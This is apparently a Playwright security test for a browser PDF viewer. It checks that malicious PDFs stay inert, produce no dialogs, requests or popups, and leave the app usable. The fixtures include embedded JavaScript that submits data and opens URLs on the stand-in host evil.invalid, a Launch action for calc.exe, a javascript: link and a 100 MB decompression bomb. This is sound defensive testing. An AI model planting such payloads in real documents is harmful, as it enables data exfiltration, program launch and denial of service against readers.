import { test, expect } from '@playwright/test';
import { PDFDocument, PDFName, PDFString, rgb } from 'pdf-lib';
import { deflateSync } from 'node:zlib';

// Each hostile document must stay inert: no dialogs, no outbound requests, no popups or
// navigation, and the app must remain usable afterwards (render or recoverable error).
async function actionsPdf() {
  const pdf = await PDFDocument.create(), page = pdf.addPage([400, 400]);
  page.drawText('Hostile actions fixture', { x: 40, y: 340, size: 14, color: rgb(0, 0, 0) });
  const js = (code: string) => pdf.context.obj({ S: 'JavaScript', JS: PDFString.of(code) });
  pdf.catalog.set(PDFName.of('OpenAction'), js("app.alert('pwned'); this.submitForm('http://evil.invalid/x');"));
  pdf.catalog.set(PDFName.of('Names'), pdf.context.obj({ JavaScript: pdf.context.obj({ Names: [PDFString.of('auto'), js("app.launchURL('http://evil.invalid/', true);")] }) }));
  page.node.set(PDFName.of('AA'), pdf.context.obj({ O: pdf.context.obj({ S: 'Launch', F: PDFString.of('C:\\Windows\\System32\\calc.exe') }), C: pdf.context.obj({ S: 'SubmitForm', F: pdf.context.obj({ FS: 'URL', F: PDFString.of('http://evil.invalid/submit') }) }) }));
  const link = pdf.context.register(pdf.context.obj({ Type: 'Annot', Subtype: 'Link', Rect: [40, 200, 300, 240], A: pdf.context.obj({ S: 'URI', URI: PDFString.of('javascript:alert(1)') }) }));
  page.node.set(PDFName.of('Annots'), pdf.context.obj([link]));
  return pdf.save();
}
async function bombPdf() {
  // Content stream that inflates from ~100 KB to 100 MB of no-op whitespace.
  const pdf = await PDFDocument.create(), page = pdf.addPage([400, 400]);
  const stream = pdf.context.flateStream(new Uint8Array(0));
  const bomb = deflateSync(Buffer.alloc(100 * 1024 * 1024, 0x20), { level: 9 });
  const raw = pdf.context.stream(bomb, { Filter: 'FlateDecode', Length: bomb.length });
  void stream;
  page.node.set(PDFName.of('Contents'), pdf.context.register(raw));
  return pdf.save();
}
function nestedPdf(depth: number) {
  // Hand-written PDF with a deeply nested array in the page dictionary.
  const nested = '['.repeat(depth) + ']'.repeat(depth);
  const objects = [
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Junk ${nested} >>`,
  ];
  let body = '%PDF-1.7\n', offsets: number[] = [];
  objects.forEach((object, index) => { offsets.push(body.length); body += `${index + 1} 0 obj\n${object}\nendobj\n`; });
  const xref = body.length;
  body += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n${offsets.map(offset => `${String(offset).padStart(10, '0')} 00000 n \n`).join('')}trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(body, 'latin1');
}

test('hostile PDFs stay inert, bounded and recoverable', async ({ page, context }) => {
  test.setTimeout(120_000);
  const dialogs: string[] = [], outbound: string[] = [], popups: string[] = [];
  let crashed = false; page.on('crash', () => { crashed = true; });
  page.on('dialog', dialog => { dialogs.push(dialog.message()); void dialog.dismiss(); });
  context.on('page', popup => popups.push(popup.url()));
  page.on('request', request => { const url = new URL(request.url()); if (!['127.0.0.1', 'localhost'].includes(url.hostname) && url.protocol !== 'blob:' && url.protocol !== 'data:') outbound.push(request.url()); });
  await page.goto('/');
  const start = page.url();
  for (const [name, bytes] of [['actions.pdf', await actionsPdf()], ['bomb.pdf', await bombPdf()], ['nested.pdf', nestedPdf(100_000)]] as const) {
    await page.getByLabel('Open PDF files', { exact: true }).setInputFiles({ name, mimeType: 'application/pdf', buffer: Buffer.from(bytes) });
    await expect(page.locator('#document-name')).toHaveText(name, { timeout: 60_000 });
    await expect(page.locator('#status')).toHaveText(new RegExp(`Page 1 of 1 · ${name.replace('.', '\.')}|Rendering failed`), { timeout: 60_000 });
  }
  // Clicking where the javascript: link annotation sits must not execute anything.
  await page.getByRole('button', { name: 'View actions.pdf', exact: true }).click();
  await expect(page.locator('#document-name')).toHaveText('actions.pdf');
  const box = (await page.getByTestId('pdf-canvas').boundingBox())!;
  await page.mouse.click(box.x + 100, box.y + 180);
  // App remains responsive: a normal document still opens and renders.
  const ok = await PDFDocument.create(); ok.addPage([200, 200]).drawText('still alive', { x: 20, y: 100, size: 12 });
  await page.getByLabel('Open PDF files', { exact: true }).setInputFiles({ name: 'ok.pdf', mimeType: 'application/pdf', buffer: Buffer.from(await ok.save()) });
  await expect(page.locator('#document-name')).toHaveText('ok.pdf');
  await expect(page.locator('#status')).toContainText('Page 1 of 1', { timeout: 30_000 });
  expect(crashed).toBe(false);
  expect(dialogs).toEqual([]);
  expect(outbound).toEqual([]);
  expect(popups).toEqual([]);
  expect(page.url()).toBe(start);
});
